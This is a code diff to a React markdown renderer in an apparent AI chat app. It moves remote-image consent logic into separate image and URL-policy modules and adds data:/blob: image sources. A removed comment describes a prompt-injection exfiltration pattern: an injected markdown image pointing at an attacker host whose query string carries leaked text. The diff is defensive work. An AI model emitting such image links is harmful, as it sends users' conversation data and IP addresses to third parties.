@@ -11,7 +11,7 @@ import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
 import type { Schema } from 'hast-util-sanitize';
 import type { PluggableList } from 'unified';
 import 'katex/dist/katex.min.css';
-import { Box, Button, Flex, Text, Heading } from '@radix-ui/themes';
+import { Box, Flex, Text, Heading } from '@radix-ui/themes';
 import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
 import { oneLight, oneDark } from 'react-syntax-highlighter/dist/esm/styles/prism';
 import { InlineCitationBadge, InlineCitationGroup } from './response-tabs/citations';
@@ -26,9 +26,11 @@ import { MermaidDiagram } from './mermaid-diagram';
 import { parseCsvContent, parseCsvCellContent } from './csv-utils';
 import { MaterialIcon } from '@/app/components/ui/MaterialIcon';
 import { touchTarget } from '@/app/components/ui/responsive';
+import { useIsMobile } from '@/lib/hooks/use-is-mobile';
+import { SafeMarkdownImage } from '@/app/components/ui/safe-markdown-image';
+import { markdownUrlTransform, rehypeStripStyleUrls } from '@/lib/utils/image-url-policy';
 import { useThemeAppearance } from '@/app/components/theme-provider';
 import { useTranslation } from 'react-i18next';
-import { useIsMobile } from '@/lib/hooks/use-is-mobile';
 import { useCanHover } from '@/lib/hooks/use-can-hover';
 import { useCopyText } from '@/lib/hooks/use-copy-text';
 import type { Root, Blockquote } from 'mdast';
@@ -49,10 +51,16 @@ import { CHAT_LINK_STYLE, isRawUrlText, shortLinkLabel } from '../../utils/link-
  *
  * The schema only needs to cover raw HTML that the LLM may embed (callouts,
  * details/summary, styled spans, etc.). Dangerous constructs — <script>,
- * on* event handlers, javascript:/data: URLs — remain blocked by defaultSchema.
+ * on* event handlers, javascript: URLs — remain blocked by defaultSchema.
+ * `data:`/`blob:` are allowed for `src` only; `SafeMarkdownImage` decides
+ * which image URLs load.
  */
 const SANITIZE_SCHEMA: Schema = {
   ...defaultSchema,
+  protocols: {
+    ...defaultSchema.protocols,
+    src: [...(defaultSchema.protocols?.src ?? []), 'data', 'blob'],
+  },
   tagNames: [
     ...(defaultSchema.tagNames ?? []),
     // Collapsible sections the LLM may emit
@@ -305,6 +313,7 @@ const REMARK_PLUGINS: PluggableList = [
 const REHYPE_PLUGINS: PluggableList = [
   rehypeRaw,
   [rehypeSanitize, SANITIZE_SCHEMA],
+  rehypeStripStyleUrls,
   rehypeKatex,
 ];
 
@@ -481,84 +490,20 @@ function TableRow({ children }: { children?: React.ReactNode }) {
   );
 }
 
-/**
- * Third-party image hosts are not fetched automatically. A document the model
- * read can carry an injected `![](https://attacker/?q=<leaked text>)`, and an
- * automatic fetch would both exfiltrate that query string and hand the host the
- * reader's IP. Same-origin and relative sources are ours, so they load as-is.
- */
-function isThirdPartyImageSrc(src: string): boolean {
-  if (!src || src.startsWith('#')) return false;
-  if (src.startsWith('/') && !src.startsWith('//')) return false;
-  try {
-    return new URL(src, window.location.href).origin !== window.location.origin;
-  } catch {
-    return false;
-  }
-}
-
-function imageHostLabel(src: string): string {
-  try {
-    return new URL(src, window.location.href).hostname;
-  } catch {
-    return src;
-  }
-}
-
-function MarkdownImage({ src, alt }: { src?: string; alt?: string }) {
-  const { t } = useTranslation();
-  const isMobile = useIsMobile();
-  const [isAllowed, setIsAllowed] = useState(false);
-  const needsConsent = Boolean(src) && !isAllowed && isThirdPartyImageSrc(src!);
-
+function MarkdownImage({ src, alt }: { src?: string | Blob; alt?: string }) {
   return (
     <Box as="span" style={{ margin: 'var(--space-3) 0', textAlign: 'center', display: 'block' }}>
-      {needsConsent ? (
-        <Flex
-          as="span"
-          direction="column"
-          align="center"
-          gap="2"
-          style={{
-            padding: 'var(--space-4)',
-            border: '1px dashed var(--slate-7)',
-            borderRadius: 'var(--radius-2)',
-            backgroundColor: 'var(--slate-2)',
-          }}
-        >
-          <MaterialIcon name="image_not_supported" size={24} color="var(--slate-9)" />
-          <Text size="1" as="span" style={{ color: 'var(--slate-11)' }}>
-            {t('chatStream.remoteImageBlocked')}
-          </Text>
-          <Text size="1" as="span" style={{ color: 'var(--slate-10)', wordBreak: 'break-all' }}>
-            {t('chatStream.remoteImageFrom', { host: imageHostLabel(src!) })}
-          </Text>
-          <Button
-            type="button"
-            size="1"
-            variant="soft"
-            color="gray"
-            style={isMobile ? { minWidth: 44, minHeight: 44 } : undefined}
-            onClick={() => setIsAllowed(true)}
-          >
-            {t('chatStream.remoteImageLoad')}
-          </Button>
-        </Flex>
-      ) : (
-        <img
-          src={src}
-          alt={alt ?? ''}
-          loading="lazy"
-          referrerPolicy="no-referrer"
-          style={{
-            maxWidth: '100%',
-            height: 'auto',
-            borderRadius: 'var(--radius-2)',
-            border: '1px solid var(--slate-5)',
-            display: 'inline-block',
-          }}
-        />
-      )}
+      <SafeMarkdownImage
+        src={src}
+        alt={alt}
+        style={{
+          maxWidth: '100%',
+          height: 'auto',
+          borderRadius: 'var(--radius-2)',
+          border: '1px solid var(--slate-5)',
+          display: 'inline-block',
+        }}
+      />
       {alt && (
         <Text
           size="1"
@@ -1189,7 +1134,7 @@ export function createMarkdownComponents(
         }}
       />
     ),
-    img: ({ src, alt }: { src?: string; alt?: string }) => (
+    img: ({ src, alt }: { src?: string | Blob; alt?: string }) => (
       <MarkdownImage src={src} alt={alt} />
     ),
     a: ({ href, children }: { href?: string; children?: React.ReactNode }) => {
@@ -1317,6 +1262,7 @@ function MarkdownBlockImpl({ source, components }: MarkdownBlockProps) {
     <ReactMarkdown
       remarkPlugins={REMARK_PLUGINS}
       rehypePlugins={REHYPE_PLUGINS}
+      urlTransform={markdownUrlTransform}
       components={components}
     >
       {source}
